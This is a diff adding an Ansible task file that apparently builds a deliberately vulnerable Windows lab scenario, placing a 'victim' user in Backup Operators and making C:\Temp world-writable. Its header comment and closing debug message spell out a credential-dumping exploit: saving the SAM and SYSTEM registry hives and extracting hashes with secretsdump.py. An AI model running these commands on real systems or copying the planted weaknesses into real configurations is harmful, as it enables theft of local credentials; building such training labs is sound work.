@@ -1,0 +1,55 @@
+---
+# Backup Operators Group Lab Setup
+# SID S-1-5-32-551 — locale-independent group lookup.
+#
+# Exploit: reg save HKLM\SAM C:\Temp\sam.hive
+#          reg save HKLM\SYSTEM C:\Temp\system.hive
+#          secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+# ═══ SCENARIO 21 — Privileged Group: Backup Operators ═══
+
+- name: Resolve Backup Operators group name from SID (locale-independent)
+  ansible.windows.win_shell: |
+    $grp = Get-CimInstance -ClassName Win32_Group -Filter 'SID="S-1-5-32-551"' -ErrorAction Stop
+    Write-Output $grp.Name
+  register: _backup_group_name
+  changed_when: false
+
+- name: Add victim user to Backup Operators group
+  ansible.windows.win_group_membership:
+    name: "{{ _backup_group_name.stdout | trim }}"
+    members:
+      - "{{ ludus_win_privesc_victim_user }}"
+    state: present
+
+- name: Ensure temp exfil directory exists and is world-writable
+  ansible.windows.win_shell: |
+    New-Item -ItemType Directory -Force -Path "C:\Temp" | Out-Null
+    icacls "C:\Temp" /grant Everyone:F | Out-Null
+
+- name: Validate victim user is member of Backup Operators
+  ansible.windows.win_shell: |
+    $members = Get-LocalGroupMember -SID "S-1-5-32-551" -ErrorAction SilentlyContinue |
+               Where-Object { $_.Name -like "*{{ ludus_win_privesc_victim_user }}" }
+    if ($members) { Write-Output "OK" } else { Write-Output "FAIL" }
+  register: _backup_operators_validate
+  tags: validate
+
+- name: Assert victim user is in Backup Operators group
+  ansible.builtin.fail:
+    msg: >
+      Backup Operators scenario validation failed —
+      '{{ ludus_win_privesc_victim_user }}' is not a member of Backup Operators.
+  when: _backup_operators_validate.stdout | trim != "OK"
+  tags: validate
+
+- name: Print Backup Operators scenario info
+  ansible.builtin.debug:
+    msg:
+      - "=== Privileged Group: Backup Operators Scenario ==="
+      - "Group: {{ _backup_group_name.stdout | trim }} (SID S-1-5-32-551)"
+      - "User '{{ ludus_win_privesc_victim_user }}' is a member."
+      - "Auto-granted: SeBackupPrivilege + SeRestorePrivilege"
+      - "Exploit: reg save HKLM\\SAM C:\\Temp\\sam.hive"
+      - "         reg save HKLM\\SYSTEM C:\\Temp\\system.hive"
+      - "         secretsdump.py -sam sam.hive -system system.hive LOCAL"
